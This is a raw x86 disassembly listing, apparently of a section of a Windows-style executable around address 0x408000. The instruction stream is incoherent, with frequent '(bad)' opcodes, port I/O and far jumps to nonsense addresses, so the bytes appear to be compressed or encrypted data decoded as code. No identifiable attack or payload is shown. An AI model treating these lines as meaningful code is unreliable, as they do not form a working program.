  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x408236
  408275:	dec    esp
  408276:	in     al,dx
  408277:	push   ecx
  408278:	into   
  408279:	int3   
  40827a:	jg     0x408200
  40827c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40827d:	test   al,0x21
  40827f:	pushf  
  408280:	sbb    DWORD PTR [ebx-0x12bd66ba],ebx
  408286:	cld    
  408287:	(bad)  
  408288:	mov    esi,?
  40828a:	neg    DWORD PTR [edi-0x67]
  40828d:	lock test DWORD PTR [eax-0x6f1a5771],esp
  408294:	imul   ebp,DWORD PTR [eax+0x2155aa77],0xcddf7733
  40829e:	aam    0xc3
  4082a0:	dec    ecx
  4082a1:	int3   
  4082a2:	pop    ebp
  4082a3:	repnz pop esp
  4082a5:	cdq    
  4082a6:	add    DWORD PTR [edx],ebx
  4082a8:	fnstenv es:[edx+0x2]
  4082ac:	mov    eax,ds:0xd0f4b641
  4082b1:	pop    ss
  4082b2:	inc    edx
  4082b3:	loopne 0x40830e
  4082b5:	jmp    0x10cd:0xe33fbb4
  4082bc:	push   edx
  4082bd:	fs mov ebp,0xa9ec8475
  4082c3:	mov    ch,0xff
  4082c5:	cli    
  4082c6:	dec    BYTE PTR [eax]
  4082c8:	pop    ds
  4082c9:	push   esp
  4082ca:	rcr    esp,1
  4082cc:	in     eax,0xd2
  4082ce:	into   
  4082cf:	rcl    DWORD PTR [esi-0x79f1d64b],0x9b
  4082d6:	lods   eax,DWORD PTR ds:[esi]
  4082d7:	inc    ebp
  4082d8:	fist   WORD PTR [esi+0x4bc4f516]
  4082de:	aas    
  4082df:	fist   DWORD PTR [ecx-0x74af39b3]
  4082e5:	mov    edi,0x5df2e9c
  4082ea:	sbb    eax,0x84ac3363
  4082ef:	scas   al,BYTE PTR es:[edi]
  4082f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082f1:	mov    bh,BYTE PTR [esi-0x48]
  4082f4:	push   0x8052cbf2
  4082f9:	in     al,0xee
  4082fb:	retf   
  4082fc:	daa    
  4082fd:	xchg   edx,eax
  4082fe:	jo     0x4082ae
  408300:	mov    al,0xd4
  408302:	fistp  WORD PTR [eax+0x5c61e551]
  408308:	shl    BYTE PTR [edx],0xac
  40830b:	outs   dx,BYTE PTR ds:[esi]
  40830c:	fistp  QWORD PTR [ebp+0x464aab9d]
  408312:	in     al,0x37
  408314:	(bad)  
  408315:	jmp    0xb5d7:0x656b20f5
  40831c:	loopne 0x40831a
  40831e:	cmp    BYTE PTR [ecx+0x744ac5bd],al
  408324:	push   esp
  408325:	jne    0x408308
  408327:	cmp    al,0x0
  408329:	xor    DWORD PTR [edi],esp
  40832b:	das    
  40832c:	cwde   
  40832d:	pushf  
  40832e:	jbe    0x408388
  408330:	pop    esp
  408331:	dec    ebx
  408332:	inc    sp
  408334:	mov    esp,DWORD PTR ds:0x55e524a7
  40833a:	cmp    eax,0x9ce12ee6
  40833f:	xchg   esp,eax
  408340:	push   0xeb48405a
  408345:	(bad)  
  408346:	cli    
  408347:	pop    ds
  408348:	cs push ebx
  40834a:	pop    edi
  40834b:	jg     0x408381
  40834d:	jo     0x408346
  40834f:	xchg   ebp,eax
  408350:	xchg   edx,eax
  408351:	push   DWORD PTR [edi+0x3f323094]
  408357:	adc    al,0x8a
  408359:	fild   DWORD PTR [ebx-0x73b26bd2]
  40835f:	leave  
  408360:	adc    al,0xa7
  408362:	mov    eax,ds:0x4e6470b5
  408367:	fcom   QWORD PTR [eax-0x50]
  40836a:	(bad)  
  40836b:	lock call DWORD PTR [edi+esi*2-0x533c0e0a]
  408373:	jae    0x408367
  408375:	sbb    DWORD PTR [edi],esp
  408377:	adc    DWORD PTR [ebp*1+0x3e60a45a],edi
  40837e:	loopne 0x408329
  408380:	pop    esi
  408381:	cwde   
  408382:	xchg   ecx,eax
  408383:	or     DWORD PTR [ecx],0x48
  408386:	mov    cl,0xb1
  408388:	popa   
  408389:	sbb    al,0x2a
  40838b:	xlat   BYTE PTR fs:[ebx]
  40838d:	jl     0x408341
  40838f:	lahf   
  408390:	pop    edi
  408391:	in     eax,dx
  408392:	pusha  
  408393:	adc    eax,0x35d8deb
  408398:	sbb    al,0x70
  40839a:	stos   BYTE PTR es:[edi],al
  40839b:	iret   
  40839c:	pop    esi
  40839d:	xchg   DWORD PTR [esi+eax*1-0x31],eax
  4083a1:	int3   
  4083a2:	clc    
  4083a3:	mov    dh,0x60
  4083a5:	xor    bh,BYTE PTR [edi]
  4083a7:	jns    0x40834e
  4083a9:	rcr    DWORD PTR [ebp+0x2507250f],cl
  4083af:	js     0x4083e3
  4083b1:	call   0xf583:0xc6866897
  4083b8:	push   esi
  4083b9:	mov    ebp,0xffee64da
  4083be:	push   edi
  4083bf:	stos   BYTE PTR es:[edi],al
  4083c0:	xor    esp,DWORD PTR [edx+0x6b]
  4083c3:	adc    eax,0x52c34b41
  4083c8:	test   BYTE PTR [ecx],ch
  4083ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083cb:	xor    edx,edi
  4083cd:	lock mov BYTE PTR [ecx-0x6b6af923],bl
  4083d4:	sahf   
  4083d5:	add    edx,DWORD PTR [eax+0x3e]
  4083d8:	cs pop eax
  4083da:	shl    edi,cl
  4083dc:	mov    cl,0x13
  4083de:	fisttp WORD PTR [eax-0x9]
  4083e1:	jecxz  0x4083bb
  4083e3:	ds adc al,0x7e
  4083e6:	push   ebp
  4083e7:	test   BYTE PTR [esi*8-0x77b9c482],0xb9
  4083ef:	xor    BYTE PTR [edx+0x34cac642],bl
  4083f5:	push   ebp
  4083f6:	bound  ebx,QWORD PTR [edx+0x2a]
  4083f9:	aas    
  4083fa:	mov    al,ds:0xa3aa593d
  4083ff:	jne    0x408382
  408401:	repz dec DWORD PTR [edi-0x8ac32d8]
  408408:	stc    
  408409:	jae    0x408428
  40840b:	into   
  40840c:	add    BYTE PTR [ebp+0x2c51a3df],0x57
  408413:	fs jle 0x4083e9
  408416:	rcl    DWORD PTR [ebx+0x5efdcecd],0xa4
  40841d:	lods   eax,DWORD PTR ds:[esi]
  40841e:	cmp    eax,0x5e14d658
  408423:	push   0xc
  408425:	fwait
  408426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408427:	js     0x40840f
  408429:	cdq    
  40842a:	(bad)  
  40842b:	ret    
  40842c:	retf   
  40842d:	ss jo  0x40844a
  408430:	(bad)  
  408431:	jge    0x4083c3
  408433:	cwde   
  408434:	(bad)  
  408436:	(bad)  
  408437:	cld    
  408438:	sub    ah,BYTE PTR [esi-0x38f6bf5a]
  40843e:	int3   
  40843f:	lods   al,BYTE PTR ds:[esi]
  408440:	add    al,BYTE PTR [ebx+0x76]
  408443:	lahf   
  408444:	dec    edi
  408445:	and    eax,0xa5c8175b
  40844a:	xchg   ecx,eax
  40844b:	jmp    0xcadad99a
  408450:	push   edi
  408451:	pop    eax
  408452:	xchg   ecx,eax
  408453:	shr    DWORD PTR ds:0xa6deb6c6,cl
  408459:	push   es
  40845a:	sar    dh,1
  40845c:	cmp    esp,DWORD PTR [esi-0x71]
  40845f:	mov    dl,0x89
  408461:	xchg   esp,eax
  408462:	mov    edx,0x9f52d326
  408467:	add    BYTE PTR [edx+0x63],dh
  40846a:	cwde   
  40846b:	cld    
  40846c:	cwde   
  40846d:	xor    al,0x48
  40846f:	test   eax,0x434b0aa5
  408474:	pusha  
  408475:	int    0xbe
  408477:	icebp  
  408478:	ficomp WORD PTR [edx]
  40847a:	inc    edx
  40847b:	stos   BYTE PTR es:[edi],al
  40847c:	sti    
  40847d:	xchg   BYTE PTR [eax+0xcabc572],al
  408483:	or     al,0xa9
  408485:	mov    ah,0xbe
  408487:	sub    BYTE PTR [edx-0x77],dl
  40848a:	inc    edi
  40848b:	pop    edi
  40848c:	mov    eax,ds:0xaee5b637
  408491:	popf   
  408492:	add    DWORD PTR ds:0x7fd2d5a7,ecx
  408498:	pop    ds
  408499:	call   0x4883683b
  40849e:	es push 0xffffffc4
  4084a1:	jnp    0x4084b0
  4084a3:	lds    edi,FWORD PTR [esi-0x2ac190f3]
  4084a9:	pop    eax
  4084aa:	dec    eax
  4084ab:	jne    0x408484
  4084ad:	cwde   
  4084ae:	mov    bl,0x18
  4084b0:	pop    esp
  4084b1:	jo     0x4084d4
  4084b3:	rol    esi,1
  4084b5:	pop    edi
  4084b6:	je     0x4084ef
  4084b8:	into   
  4084b9:	sbb    edi,edx
  4084bb:	shr    DWORD PTR [edx+0x47],0xac
  4084bf:	in     eax,dx
  4084c0:	mov    al,ds:0x88aabb0b
  4084c5:	pop    ebp
  4084c6:	xor    ebx,DWORD PTR [eax-0x41276bc8]
  4084cc:	and    esi,DWORD PTR [ebx+0x49]
  4084cf:	adc    BYTE PTR [edi+0x6a4e849d],al
  4084d5:	lock cs xchg esp,eax
  4084d8:	pop    ds
  4084d9:	jmp    0x408513
  4084db:	mov    ?,WORD PTR [eax]
  4084dd:	retf   0x87b2
  4084e0:	adc    ecx,DWORD PTR [esi+0x46]
  4084e3:	fnstsw WORD PTR [esi]
  4084e5:	(bad)  
  4084e6:	mov    bh,0xfb
  4084e8:	jecxz  0x4084c0
  4084ea:	daa    
  4084eb:	ds aam 0x20
  4084ee:	or     DWORD PTR [ebp-0x22],ebx
  4084f1:	sbb    eax,0xbab41952
  4084f6:	and    ch,ch
  4084f8:	jmp    0xd7179270
  4084fd:	imul   ebx,esp,0x42
  408500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408501:	cmp    cl,BYTE PTR [eax+0x62]
  408504:	jge    0x4084f2
  408506:	rcr    DWORD PTR [edx-0x60],0xa7
  40850a:	sbb    cl,BYTE PTR [ecx]
  40850c:	jae    0x4084bd
  40850e:	sub    esp,eax
  408510:	(bad)  
  408511:	aaa    
  408512:	test   DWORD PTR [esi],ebp
  408514:	xchg   ebp,eax
  408515:	inc    edx
  408516:	call   DWORD PTR [esi]
  408518:	xor    edi,DWORD PTR [esi-0x7278fe4]
  40851e:	sub    ecx,DWORD PTR [ecx]
  408520:	push   edx
  408521:	mov    WORD PTR [edi+edi*1],es
  408524:	fld    QWORD PTR [ecx+0x1e]
  408527:	xor    al,0x43
  408529:	std    
  40852a:	pop    ds
  40852b:	ins    BYTE PTR es:[edi],dx
  40852c:	lds    esi,FWORD PTR ds:0x3b091c9d
  408532:	adc    al,0x73
  408534:	or     eax,0x7da000c0
  408539:	enter  0x2552,0x83
  40853d:	shr    BYTE PTR [ebx-0x13953286],0x5a
  408544:	sbb    ebp,DWORD PTR [ebp*2-0x4e256de2]
  40854b:	ds xor dh,cl
  40854e:	or     DWORD PTR [ebp-0x49],0xc321c55c
  408555:	pop    ebp
  408556:	dec    ecx
  408557:	sbb    al,BYTE PTR [ebx]
  408559:	add    eax,0x55868f20
  40855e:	jmp    0x408559
  408560:	lock jbe 0x4084f0
  408563:	call   0x3640:0x36fc5e8c
  40856a:	pop    es
  40856b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40856c:	mov    eax,ds:0x7b3b61f0
  408571:	push   0xffffff94
  408573:	loopne 0x408505
  408575:	and    DWORD PTR [edx+0x4b],0x35
  408579:	xor    dh,BYTE PTR [ebp+ebp*1+0x11]
  40857d:	and    BYTE PTR [esi+0xdc4f75f],al
  408583:	dec    eax
  408584:	inc    ebp
  408585:	add    eax,0x380670f9
  40858a:	xor    DWORD PTR [ecx*2+0x2cdf575b],esp
  408591:	test   BYTE PTR [esp+ebp*1],ch
  408594:	sbb    BYTE PTR [ecx],ah
  408596:	push   ss
  408597:	fcomp  QWORD PTR [esi+0x12e3bee8]
  40859d:	ja     0x4085f0
  40859f:	arpl   cx,dx
  4085a1:	and    DWORD PTR [esi],edi
  4085a3:	push   esp
  4085a4:	mov    BYTE PTR [ecx],al
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0xf6a5acce
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x4085f0
  4085c4:	cmp    dh,al
  4085c6:	(bad)  [ecx]
  4085c8:	add    BYTE PTR [esi+edx*2+0x7930d969],ch
  4085cf:	mov    ebp,0x48adc0b6
  4085d4:	shl    eax,cl
  4085d6:	aam    0x90
  4085d8:	add    edx,ebp
  4085da:	imul   BYTE PTR [ebp-0x75]
  4085dd:	inc    edi
  4085de:	and    ebp,edi
  4085e0:	inc    edx
  4085e1:	mov    dl,cl
  4085e3:	mov    bh,0xe9
  4085e5:	outs   dx,DWORD PTR ds:[esi]
  4085e6:	mov    dh,BYTE PTR [ebx]
  4085e8:	ror    DWORD PTR [ecx],cl
  4085ea:	or     al,0x74
  4085ec:	js     0x4085bb
  4085ee:	jle    0x40858a
  4085f0:	jb     0x4085e2
  4085f2:	cli    
  4085f3:	xor    edx,edi
  4085f5:	inc    esi
  4085f6:	mov    ch,0xdb
  4085f8:	xor    al,BYTE PTR [esi]
  4085fa:	(bad)  
  4085fc:	xlat   BYTE PTR ds:[ebx]
  4085fd:	pop    ss
  4085fe:	sub    eax,0x10c778b3
  408603:	(bad)  
  408604:	loopne 0x408654
  408606:	add    eax,0x7e562189
  40860b:	add    al,0x4a
  40860d:	xchg   esp,eax
  40860e:	pop    esi
  40860f:	mov    edx,0x5a2cf3d5
  408614:	push   ds
  408615:	in     eax,dx
  408616:	jb     0x40868a
  408618:	add    al,0xb1
  40861a:	out    dx,eax
  40861b:	jae    0x4085de
  40861d:	out    0xe1,al
  40861f:	jmp    0xec6688cd
  408624:	inc    eax
  408625:	jle    0x408645
  408627:	pop    esi
  408628:	mov    al,ds:0x70a4d683
  40862d:	sbb    BYTE PTR [ebx-0x7fd40108],ch
  408633:	test   eax,0x63de1e16
  408638:	lea    dx,[edi-0x5b]
  40863c:	shr    DWORD PTR [eax+0x3016a595],0xff
  408643:	outs   dx,BYTE PTR ds:[esi]
  408644:	jmp    0xcd5a9740
  408649:	enter  0x207b,0x68
  40864d:	push   ss
  40864e:	sar    DWORD PTR [ecx],cl
  408650:	cdq    
  408651:	and    DWORD PTR [eax+0x17a5e1d],esi
  408657:	shr    bl,1
  408659:	inc    eax
  40865a:	out    0x7f,eax
  40865c:	or     DWORD PTR [edx-0x24],esi
  40865f:	stos   BYTE PTR es:[edi],al
  408660:	and    al,0xaf
  408662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408663:	test   bh,bh
  408665:	push   ss
  408666:	push   es
  408667:	ror    eax,1
  408669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40866a:	ins    BYTE PTR es:[edi],dx
  40866b:	inc    edi
  40866c:	les    eax,FWORD PTR [eax-0x310ee487]
  408672:	ds call 0x28c489cd
  408678:	xlat   BYTE PTR ds:[ebx]
  408679:	aas    
  40867a:	arpl   WORD PTR [esi+edi*2+0x0],di
  40867e:	gs cdq 
  408680:	adc    ah,bh
  408682:	aas    
  408683:	mov    cl,BYTE PTR [ebx-0x2e]
  408686:	pop    es
  408687:	addr16 inc eax
  408689:	ins    DWORD PTR es:[edi],dx
  40868a:	lahf   
  40868b:	dec    ebp
  40868c:	ror    DWORD PTR [ebp+0x2c69d054],0xb2
  408693:	pop    edx
  408694:	ror    cl,0x3c
  408697:	dec    esp
  408698:	daa    
  408699:	xlat   BYTE PTR ds:[ebx]
  40869a:	push   esi
  40869b:	pop    ebp
  40869c:	jbe    0x4086b4
  40869e:	rol    BYTE PTR [edx+0x53],cl
  4086a1:	js     0x40865e
  4086a3:	sahf   
  4086a4:	pop    ss
  4086a5:	into   
  4086a6:	cmp    bl,BYTE PTR [edx+0x240049e0]
  4086ac:	js     0x4086ec
  4086ae:	cli    
  4086af:	(bad)  
  4086b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086b1:	xor    ebp,DWORD PTR [edx+0x68538f91]
  4086b7:	cmp    bl,BYTE PTR [edi+0x3f]
  4086ba:	pop    ecx
  4086bb:	and    dh,0xcc
  4086be:	push   es
  4086bf:	repz or BYTE PTR [edi],bl
  4086c2:	sbb    BYTE PTR [edx+0x4d],bh
  4086c5:	inc    edi
  4086c6:	or     DWORD PTR [ebp-0x18],0x4d
  4086ca:	(bad)  
  4086cb:	mov    BYTE PTR [ebx],ah
  4086cd:	push   ebp
  4086ce:	add    al,0x9d
  4086d0:	out    0x7c,al
  4086d2:	mov    dl,0xc9
  4086d4:	stos   DWORD PTR es:[edi],eax
  4086d5:	cmp    al,0xa7
  4086d7:	mov    gs,WORD PTR [edi]
  4086d9:	ja     0x4086e6
  4086db:	cmp    ebp,DWORD PTR [ebx]
  4086dd:	cs test al,0x14
  4086e1:	rcl    dl,cl
  4086e3:	xchg   ecx,eax
  4086e4:	xchg   bh,cl
  4086e6:	inc    ebp
  4086e7:	ret    
  4086e8:	leave  
  4086e9:	cmp    al,BYTE PTR [esp+eiz*8+0x5f]
  4086ed:	mov    al,0x57
  4086ef:	ds ret 
  4086f1:	pop    edi
  4086f2:	mov    ch,0x6
  4086f4:	and    BYTE PTR [edx],0x1
  4086f7:	call   0xefe8dbef
  4086fc:	cmp    BYTE PTR [esp+eiz*8-0x4a3b7c3c],bl
  408703:	sbb    bl,BYTE PTR [eax-0x565ecab8]
  408709:	or     eax,0xc7d4dc2e
  40870e:	fs out dx,eax
  408710:	enter  0xb67f,0xfe
  408714:	mov    ebx,0xf2067427
  408719:	jge    0x408725
  40871b:	int    0xa7
  40871d:	enter  0x73e6,0x79
  408721:	pop    ss
  408722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408724:	idiv   BYTE PTR [eax+eax*1]
  408727:	js     0x40873f
  408729:	mov    eax,ds:0x8d455e95
  40872e:	int3   
  40872f:	cmp    al,0x19
  408731:	push   edi
  408732:	sbb    ecx,DWORD PTR [esi+ebx*1+0x4c]
  408736:	retf   0x8d89
  408739:	jge    0x408735
  40873b:	es cmp eax,0x3fb676e8
  408741:	lea    esi,[ebp+0x3a61e36e]
  408747:	inc    edi
  408748:	add    dl,BYTE PTR [edx-0x54]
  40874b:	xchg   esi,eax
  40874c:	(bad)  
  40874e:	xor    esi,DWORD PTR [edi+0x66]
  408751:	adc    edx,DWORD PTR [ecx+0x27]
  408754:	xlat   BYTE PTR ds:[ebx]
  408755:	std    
  408756:	sub    ch,dl
  408758:	cld    
  408759:	pop    ebp
  40875a:	in     al,dx
  40875b:	jno    0x408714
  40875d:	cmp    al,0x8e
  40875f:	add    edi,eax
  408761:	in     al,0x82
  408763:	cmp    al,BYTE PTR [eax-0x985ecc4]
  408769:	cmp    DWORD PTR [esi+0x7],ecx
  40876c:	scas   eax,DWORD PTR es:[edi]
  40876d:	neg    DWORD PTR [edx]
  40876f:	dec    ecx
  408770:	sbb    al,0xe4
  408772:	xchg   edx,eax
  408773:	dec    eax
  408774:	outs   dx,DWORD PTR ds:[esi]
  408775:	gs jg  0x408767
  408778:	pusha  
  408779:	out    dx,eax
  40877a:	mov    al,ds:0xb7c96a47
  40877f:	loopne 0x408794
  408781:	mov    dh,0xe3
  408783:	jne    0x4087d1
  408785:	aaa    
  408786:	aaa    
  408787:	mov    WORD PTR ds:0x4c44ed1,fs
  40878d:	idiv   DWORD PTR [edx-0x3f]
  408790:	sbb    DWORD PTR [eax+0x515975a8],esp
  408796:	lods   eax,DWORD PTR ds:[esi]
  408797:	jnp    0x40875c
  408799:	(bad)  
  40879a:	sahf   
  40879b:	ins    DWORD PTR es:[edi],dx
  40879c:	xchg   esp,eax
  40879d:	repz leave 
  40879f:	scas   al,BYTE PTR es:[edi]
  4087a0:	mov    dh,0xa1
  4087a2:	and    cl,dh
  4087a4:	lods   eax,DWORD PTR ds:[esi]
  4087a5:	mov    ds:0x5c9dcb2c,al
  4087aa:	jp     0x4087f7
  4087ac:	fisttp WORD PTR [ecx-0x6a]
  4087af:	sbb    bl,BYTE PTR [ebx-0x46b9ea3a]
  4087b5:	iret   
  4087b6:	cli    
  4087b7:	and    BYTE PTR [ecx+0x1a28761c],al
  4087bd:	pusha  
  4087be:	ror    ah,1
  4087c0:	call   0xcb8c9945
  4087c5:	mov    dl,0x91
  4087c7:	(bad)  
  4087c8:	cld    
  4087c9:	lahf   
  4087ca:	or     bl,cl
  4087cc:	fwait
  4087cd:	ja     0x4087d4
  4087cf:	mov    eax,0x197e0e0d
  4087d4:	cli    
  4087d5:	inc    DWORD PTR [eax+0x40]
  4087d8:	jno    0x4087cb
  4087da:	fisttp DWORD PTR [edi+0xfcc82d4]
  4087e0:	and    BYTE PTR [eax-0x74aa99bc],dh
  4087e6:	mov    gs,WORD PTR [ebp+0x18]
  4087e9:	inc    ecx
  4087ea:	dec    edi
  4087eb:	dec    edi
  4087ed:	(bad)  
  4087ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087f0:	pop    ebp
  4087f1:	push   edi
  4087f2:	mov    ebx,DWORD PTR [ecx-0x3a1238c5]
  4087f8:	xlat   BYTE PTR ds:[ebx]
  4087f9:	lods   eax,DWORD PTR ds:[esi]
  4087fa:	mov    DWORD PTR [ebx-0x70],edi
  4087fd:	mov    al,0xb
  4087ff:	push   es
  408800:	cmp    al,0xae
  408802:	push   ss
  408803:	inc    esi
  408804:	jns    0x408852
  408806:	(bad)  
  408807:	push   0xffffff8d
  408809:	call   0x82f7e8d3
  40880e:	sub    ebx,DWORD PTR [edx+eiz*1+0x4e6c11ab]
  408815:	inc    esp
  408816:	jb     0x408862
  408818:	loope  0x408864
  40881a:	hlt    
  40881b:	dec    eax
  40881c:	fdivr  st(1),st
  40881e:	fsub   st(3),st
  408820:	sub    DWORD PTR [ecx-0x1c8cfc36],edi
  408826:	mov    DWORD PTR [edx+0x14c670ac],edi
  40882c:	adc    ah,BYTE PTR [edx+0x788233f]
  408832:	sub    eax,0x7a7cc28b
  408837:	inc    edi
  408838:	xchg   DWORD PTR [edx+ebp*2],edx
  40883b:	cwde   
  40883c:	addr16 mov ebp,0x663be616
  408842:	mov    bl,0x69
  408844:	dec    edx
  408845:	mov    ebx,0x8be77a0b
  40884a:	cdq    
  40884b:	sub    eax,0x54af3cec
  408850:	jmp    0xcbe7:0xe349d2e3
  408857:	inc    ebp
  408858:	jns    0x4088cf
  40885a:	xchg   esi,eax
  40885b:	push   esi
  40885c:	inc    edx
  40885d:	adc    BYTE PTR [esi+0x46c03095],bh
  408863:	sbb    eax,0xb17122b2
  408868:	out    0x96,eax
  40886a:	std    
  40886b:	sbb    ah,dh
  40886d:	test   BYTE PTR [edi+0x32cb7da8],bh
  408873:	jge    0x4088b2
  408875:	fild   QWORD PTR [edx]
  408877:	pop    edx
  408878:	sbb    eax,0xecc05ca4
  40887d:	push   cs
  40887e:	(bad)  
  40887f:	outs   dx,DWORD PTR ds:[esi]
  408880:	inc    DWORD PTR [ecx-0x60]
  408883:	gs fs xchg esp,eax
  408886:	enter  0x78fc,0xdf
  40888a:	ss stos BYTE PTR es:[edi],al
  40888c:	lock or DWORD PTR [esi-0x5d],edi
  408890:	ins    DWORD PTR es:[edi],dx
  408891:	and    DWORD PTR [edx-0x5bb90f7],ebx
  408897:	xchg   esp,eax
  408898:	stos   BYTE PTR es:[edi],al
  408899:	int3   
  40889a:	inc    edi
  40889b:	test   DWORD PTR [edi-0x54ea029f],edi
  4088a1:	psubq  mm2,mm1
  4088a4:	fild   DWORD PTR [eax+0x73621ddf]
  4088aa:	mov    ebx,0x2854ba4e
  4088af:	popa   
  4088b0:	in     eax,dx
  4088b1:	push   ebp
  4088b3:	xchg   ebx,eax
  4088b4:	data16 jg 0x408894
  4088b7:	ficom  DWORD PTR [ebx-0x8f8e315]
  4088bd:	icebp  
  4088be:	scas   al,BYTE PTR es:[edi]
  4088bf:	cmovno esp,DWORD PTR [ecx+ebp*8+0x76]
  4088c4:	test   eax,0xe8417a00
  4088c9:	add    BYTE PTR [esp+edx*8-0x6963ae22],ch
  4088d0:	test   eax,0xc3f286fa
  4088d5:	dec    eax
  4088d6:	cmp    ebx,DWORD PTR [esi]
  4088d8:	(bad)  
  4088d9:	cmp    al,0xe0
  4088db:	mov    WORD PTR [eax],cs
  4088dd:	mov    ebp,0xfd6a2a0
  4088e2:	pusha  
  4088e3:	dec    ebx
  4088e4:	popf   
  4088e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088e7:	or     al,0x2f
  4088e9:	pop    edi
  4088ea:	pop    edi
  4088eb:	popa   
  4088ec:	jl     0x408880
  4088ee:	shl    edx,1
  4088f0:	nop    ebp
  4088f3:	lea    eax,[ebp-0x8]
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp+0x1a435cff],cl
  40890c:	inc    esp
  40890d:	ret    0x97c5
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x40898d
  408918:	jo     0x408904
  40891a:	lea    esp,[eax]
  40891c:	push   0x36338da2
  408921:	add    eax,0xe4df888f
  408926:	add    DWORD PTR [eax-0x74],eax
  408929:	aam    0xd4
  40892b:	sub    BYTE PTR [ecx+0x16],dh
  40892e:	or     ah,BYTE PTR [edx]
  408930:	add    DWORD PTR [eax+edx*4-0x5ef2afcd],ebp
  408937:	or     al,ch
  408939:	js     0x4089a1
  40893b:	cmp    cl,BYTE PTR [edx+0x70]
  40893e:	ror    al,0xa3
  408941:	shl    DWORD PTR [ebp+0x5b],0x8c
  408945:	(bad)  
  408946:	loop   0x408902
  408948:	jg     0x408973
  40894a:	out    dx,al
  40894b:	cld    
  40894c:	lods   al,BYTE PTR ds:[esi]
  40894d:	inc    edx
  40894e:	xchg   edx,eax
  40894f:	push   esi
  408950:	inc    esp
  408951:	cmc    
  408952:	mov    esi,0xc069d78b
  408957:	das    
  408958:	cmp    eax,0xaececbd1
  40895d:	xchg   DWORD PTR [eax-0x52],ebx
  408960:	addr16 mov eax,ds:0xc566
  408964:	sbb    BYTE PTR [edx+ebx*4+0x65],cl
  408968:	aaa    
  408969:	or     BYTE PTR [esi-0x5e7fca54],0xa1
  408970:	fdiv   QWORD PTR [ebx-0x15]
  408973:	std    
  408974:	push   cs
  408975:	pop    ebx
  408976:	scas   al,BYTE PTR es:[edi]
  408977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408978:	push   edx
  408979:	sbb    eax,0x5eb3d3e1
  40897e:	sub    eax,0xc8dfe1a8
  408983:	cmp    esp,DWORD PTR [edx+0x485632ad]
  408989:	repnz outs dx,DWORD PTR ds:[esi]
  40898b:	(bad)  
  40898c:	hlt    
  40898d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40898e:	stos   DWORD PTR es:[edi],eax
  40898f:	dec    eax
  408990:	cmp    dl,BYTE PTR [esi-0xcf0db9e]
  408996:	scas   eax,DWORD PTR es:[edi]
  408997:	stc    
  408998:	or     ch,0x26
  40899b:	scas   al,BYTE PTR es:[edi]
  40899c:	sbb    ecx,DWORD PTR [edi-0x62]
  40899f:	test   dh,dh
  4089a1:	add    eax,0xf04c9b27
  4089a6:	add    BYTE PTR [ebx-0x61],ch
  4089a9:	jl     0x4089b0
  4089ab:	xor    al,0x19
  4089ad:	cmp    eax,0x137c28bc
  4089b2:	xor    ebp,DWORD PTR [edi]
  4089b4:	jg     0x4089f9
  4089b6:	sahf   
  4089b7:	cs pop esi
  4089b9:	ins    DWORD PTR es:[edi],dx
  4089ba:	pop    esp
  4089bb:	jo     0x4089dc
  4089bd:	mov    ah,0x6b
  4089bf:	push   ecx
  4089c0:	sahf   
  4089c1:	in     eax,0x60
  4089c3:	push   esi
  4089c4:	aaa    
  4089c5:	mov    al,ds:0x923f0d36
  4089ca:	dec    esi
  4089cb:	shl    esp,cl
  4089cd:	sub    ebx,DWORD PTR [bx+di]
  4089d0:	and    edi,esi
  4089d2:	pushf  
  4089d3:	ss out dx,eax
  4089d5:	sbb    al,0xbf
  4089d7:	stos   DWORD PTR es:[edi],eax
  4089d8:	xor    edx,DWORD PTR [ecx]
  4089da:	adc    BYTE PTR [edi+0x70f2fd16],ah
  4089e0:	and    edx,ecx
  4089e2:	jl     0x408a2a
  4089e4:	or     eax,0x9ca5fc9b
  4089e9:	sub    al,0x41
  4089eb:	jne    0x4089aa
  4089ed:	retf   
  4089ee:	fdiv   DWORD PTR [ebx]
  4089f0:	mov    bh,0x33
  4089f2:	je     0x4089e9
  4089f4:	mov    ebp,DWORD PTR [ebp+0x566d55d2]
  4089fa:	or     esp,DWORD PTR [ebp-0x6b05bb39]
  408a00:	out    dx,eax
  408a01:	test   BYTE PTR [ebp-0x603508f0],ah
  408a07:	sar    al,cl
  408a09:	and    dl,BYTE PTR [ecx]
  408a0b:	cmp    DWORD PTR [ebx],ebp
  408a0d:	cmp    DWORD PTR ds:0xbfee7a15,esp
  408a13:	fsub   st,st(5)
  408a15:	mov    WORD PTR [esi-0x4e],gs
  408a18:	ja     0x408a62
  408a1a:	nop
  408a1b:	adc    eax,0xd9b6a07
  408a20:	mov    esp,DWORD PTR ds:[ebp+0x70b74942]
  408a27:	test   BYTE PTR [edx+esi*1+0x67],0xcf
